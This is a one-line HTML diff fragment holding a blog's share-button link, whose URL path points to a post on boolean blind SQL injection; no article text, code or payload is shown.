+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="cmawcq0ns004nrk7kff4udihi" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
